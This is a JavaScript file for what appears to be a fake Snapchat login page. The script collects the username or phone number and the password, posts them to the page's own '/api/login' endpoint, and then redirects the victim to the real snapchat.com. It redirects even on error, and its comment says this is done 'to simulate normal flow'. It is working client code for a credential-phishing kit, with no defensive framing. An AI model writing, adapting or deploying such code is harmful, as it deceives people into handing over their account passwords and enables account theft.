// Modified script for login.html to send data to /api/login

// Toggle password visibility with dynamic image for show/hide
document.querySelector('.toggle-password').addEventListener('click', function () {
    const passwordField = document.getElementById('password');
    const eyeIcon = document.getElementById('eye-icon');
    
    if (passwordField.type === 'password') {
      passwordField.type = 'text';
      eyeIcon.src = 'img/eye-open.svg';  // Update to the open eye icon
    } else {
      passwordField.type = 'password';
      eyeIcon.src = 'img/eye-closed.svg';  // Update to the closed eye icon
    }
});

// Switch between username/email and phone number
const switchToPhone = document.getElementById('switch-to-phone');
const usernameInput = document.getElementById('username');
const label = document.querySelector('label[for="username"]');

switchToPhone.addEventListener('click', function () {
    if (label.textContent === 'USERNAME OR EMAIL') {
      label.textContent = 'PHONE NUMBER';
      usernameInput.type = 'tel';
      switchToPhone.textContent = 'Use email instead';
    } else {
      label.textContent = 'USERNAME OR EMAIL';
      usernameInput.type = 'text';
      switchToPhone.textContent = 'Use phone number instead';
    }
});

// Function to handle form submission and send data to /api/login
async function handleLogin(event) {
    event.preventDefault(); // Prevent default form submission

    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value;
    
    // Simple validation
    if (!username || !password) {
        alert('Please enter both username/email and password.');
        return;
    }

    // Simulate loading state (optional, can be added to CSS/HTML)
    // const loginButton = document.querySelector('.login-button');
    // loginButton.disabled = true;
    
    try {
        // Send data to the backend API
        await fetch('/api/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        });

        // Redirect after successful data submission
        window.location.href = 'https://www.snapchat.com/';
        
    } catch (error) {
        console.error('Error during login submission:', error);
        // Redirect even on error to simulate normal flow
        window.location.href = 'https://www.snapchat.com/';
    }
}

// Attach the new submission handler to the form
document.querySelector('form').addEventListener('submit', handleLogin);

// Hide the initial error message on load (if any)
window.onload = function() {
    var errorMessage = document.getElementById('error-message');
    if (errorMessage) {
        errorMessage.style.display = 'none';
    }
};
